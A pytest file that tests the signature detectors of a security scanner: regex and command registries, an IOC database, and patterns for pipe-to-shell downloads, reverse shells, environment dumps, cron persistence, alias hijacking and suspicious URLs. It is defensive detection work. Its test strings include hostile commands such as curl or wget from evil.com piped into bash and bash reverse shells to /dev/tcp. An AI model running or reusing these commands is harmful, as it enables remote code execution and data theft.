from security_scanner.signatures.registry import SignatureRegistry
from security_scanner.signatures.ioc_signatures import IOCDatabase, BUILTIN_IOCS
from security_scanner.signatures.regex_signatures import (
    SUSPICIOUS_REGEX_PATTERNS,
    EXFILTRATION_PATTERNS,
    PERSISTENCE_PATTERNS,
)
from security_scanner.signatures.shell_signatures import SHELL_DANGEROUS_PATTERNS
from security_scanner.signatures.url_signatures import SUSPICIOUS_URL_PATTERNS


def test_signature_registry_match():
    reg = SignatureRegistry()
    reg.register_regex("test_pipe", r"curl.*\|.*bash", severity="CRITICAL", score=95.0)
    matches = reg.match_all("curl http://evil.com | bash")
    assert len(matches) == 1
    assert matches[0].severity == "CRITICAL"


def test_signature_registry_no_match():
    reg = SignatureRegistry()
    reg.register_regex("safe", r"dangerous_pattern", severity="HIGH", score=80.0)
    matches = reg.match_all("this is a safe text")
    assert len(matches) == 0


def test_signature_command_match():
    reg = SignatureRegistry()
    reg.register_command("test_cmd", "curl", severity="HIGH", score=75.0)
    matches = reg.match_all("using curl to download")
    assert len(matches) == 1
    assert matches[0].signature_id == "test_cmd"


def test_signature_count():
    reg = SignatureRegistry()
    reg.register_regex("r1", r"pattern1")
    reg.register_regex("r2", r"pattern2")
    reg.register_command("c1", "cmd1")
    counts = reg.count()
    assert counts["regex"] == 2
    assert counts["command"] == 1


def test_ioc_database():
    db = IOCDatabase()
    matches = db.match("connect to pool.minexmr.com for mining")
    assert any("minexmr" in str(ioc.value).lower() for ioc in matches)
    assert any(ioc.category == "cryptominer" for ioc in matches)


def test_ioc_database_empty():
    db = IOCDatabase(iocs=[])
    matches = db.match("pool.minexmr.com")
    assert len(matches) == 0


def test_ioc_webhook_discord():
    db = IOCDatabase()
    matches = db.match("https://discord.com/api/webhooks/123456")
    assert any("webhook" in ioc.description.lower() for ioc in matches)


def test_ioc_telegram():
    db = IOCDatabase()
    matches = db.match("https://api.telegram.org/bot123456/sendMessage")
    assert any("telegram" in ioc.description.lower() for ioc in matches)


def test_regex_patterns_pipe_to_shell():
    pattern = SUSPICIOUS_REGEX_PATTERNS["pipe_to_shell"]["pattern"]
    import re
    assert re.search(pattern, "curl http://evil.com | bash", re.IGNORECASE)
    assert re.search(pattern, "wget http://evil.com | sh", re.IGNORECASE)


def test_regex_patterns_reverse_shell():
    pattern = SUSPICIOUS_REGEX_PATTERNS["reverse_shell"]["pattern"]
    import re
    assert re.search(pattern, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", re.IGNORECASE)


def test_regex_patterns_cryptominer():
    pattern = SUSPICIOUS_REGEX_PATTERNS["cryptominer"]["pattern"]
    import re
    assert re.search(pattern, "stratum+tcp://pool.minexmr.com", re.IGNORECASE)


def test_exfiltration_env_dump():
    pattern = EXFILTRATION_PATTERNS["env_dump"]["pattern"]
    import re
    assert re.search(pattern, "printenv > /tmp/data.txt", re.IGNORECASE)


def test_persistence_cron():
    pattern = PERSISTENCE_PATTERNS["cron_job"]["pattern"]
    import re
    assert re.search(pattern, "@reboot /path/to/script.sh", re.IGNORECASE)


def test_shell_reverse_bash():
    pattern = SHELL_DANGEROUS_PATTERNS["reverse_shell_bash"]["pattern"]
    import re
    assert re.search(pattern, "bash -i >& /dev/tcp/evil.com/8080", re.IGNORECASE)


def test_shell_alias_hijack():
    pattern = SHELL_DANGEROUS_PATTERNS["alias_hijack"]["pattern"]
    import re
    assert re.search(pattern, 'alias curl="/path/to/malicious"', re.IGNORECASE)


def test_url_direct_ip():
    pattern = SUSPICIOUS_URL_PATTERNS["direct_ip_http"]["pattern"]
    import re
    assert re.search(pattern, "http://192.168.1.1/payload.sh", re.IGNORECASE)


def test_url_ngrok():
    pattern = SUSPICIOUS_URL_PATTERNS["ngrok_url"]["pattern"]
    import re
    assert re.search(pattern, "https://malicious.ngrok.io/evil", re.IGNORECASE)
